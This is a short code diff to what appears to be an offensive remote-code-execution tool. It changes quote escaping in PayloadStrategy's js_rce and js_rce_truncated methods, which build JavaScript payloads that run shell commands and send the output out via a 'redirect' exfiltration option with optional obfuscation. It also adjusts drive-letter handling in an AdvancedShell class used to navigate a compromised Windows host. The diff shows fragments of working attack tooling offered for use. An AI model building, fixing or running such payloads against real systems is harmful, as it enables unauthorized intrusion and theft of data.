@@ -113,7 +113,7 @@ class PayloadStrategy:
     @staticmethod
     def js_rce(cmd,exfil='redirect',obf_level=0,**kw):
         """Build the JS code that goes into _prefix."""
-        ce=cmd.replace("\\","\\\\").replace("'","\\'").replace('"','\\"')
+        ce=cmd.replace("\\","\\\\").replace("'","\\\\'").replace('"','\\"')
         cwd=kw.pop('cwd',None)
         cwd_opt=''
         if cwd:
@@ -137,7 +137,7 @@ class PayloadStrategy:
     @staticmethod
     def js_rce_truncated(cmd,max_bytes=4000,exfil='redirect',obf_level=0,**kw):
         """Like js_rce but truncates output server-side for large commands."""
-        ce=cmd.replace("\\","\\\\").replace("'","\\'").replace('"','\\"')
+        ce=cmd.replace("\\","\\\\").replace("'","\\\\'").replace('"','\\"')
         cwd=kw.pop('cwd',None)
         cwd_opt=''
         if cwd:
@@ -905,6 +905,8 @@ class AdvancedShell:
                             if path=='..' and self.current_dir:
                                 parts=self.current_dir.rstrip('\\').rsplit('\\',1)
                                 new_dir=parts[0] if len(parts)>1 else self.current_dir
+                                # Bare drive letter 'D:' means current dir on that drive, add \\ for root
+                                if len(new_dir)==2 and new_dir[1]==':':new_dir+='\\'
                             elif path=='.':
                                 new_dir=self.current_dir or ''
                             elif ':\\' in path or path.startswith('\\\\') or ':/' in path:
